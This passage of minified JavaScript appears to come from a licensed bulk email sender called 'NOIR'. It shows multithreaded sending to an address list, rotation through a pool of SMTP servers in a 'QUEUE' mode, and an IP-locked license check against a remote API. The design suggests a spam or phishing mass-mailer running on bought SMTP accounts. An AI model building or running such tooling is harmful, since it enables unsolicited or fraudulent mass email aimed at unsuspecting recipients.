                    "QUEUE" == setup.MultipleSmtp &&
                      (0 == smtp.length
                        ? (console.log(
                            "QUEUE MODE =v= SMTP NOT WORKING =v= NO SMTP LEFT"
                              .red
                          ),
                          console.error(
                            (
                              "[" +
                              (e + 1) +
                              "/" +
                              array.length +
                              "] SMTP OUT OF STOCK =V= FAILED TO SEND ===>" +
                              array[e]
                            ).red
                          ),
                          process.exit(0))
                        : (console.error(("" + t.response).red),
                          console.error(
                            "QUEUE MODE =v= SMTP NOT WORKING =v= CHANGE TO NEXT SMTP"
                              .bgMagenta
                          ),
                          useSmtp++));
                }));
        } catch (t) {
          console.log("end error"),
            console.log(t),
            console.error(
              (
                "[" +
                (e + 1) +
                "/" +
                array.length +
                "] " +
                array[e] +
                " getting error ===>" +
                t
              ).red
            ),
            (e += setup.howManyThread),
            (e == array.length || e > array.length) && process.exit(1),
            console.error(("" + t).red);
        }
      }
    })();
else {
  const t = { key: setup.key };
  _axios({
    method: "post",
    url: "https://vanilla.500daysofspring.com/public/api/flanky2",
    data: t,
  })
    .then(function (t) {
      process.stdout.write("[2J[0;0H"),
        console.log(
          "\n               NOIR USERNAME : " +
            t.data.name +
            "\n               IP REGISTERED : " +
            t.data.ip +
            "\n                "
        ),
        console.log();
      _inquirer
        .prompt([{ type: "input", name: "newip", message: "Input New Ip : " }])
        .then((e) => {
          const t = { key: setup.key, newip: e.newip };
          _axios({
            method: "post",
            url: "https://vanilla.500daysofspring.com/public/api/changes",
            data: t,
          })
            .then((e) => {
              console.log(("" + e.data).gray);
            })
            .catch((e) => {
              console.log(e);
            });
        })
        .catch(() => (console.log(e.response.data), process.exit(0)));
    })
    .catch(function (e) {
      console.log(("" + e.response.data.mgs).bgRed);
    });
}
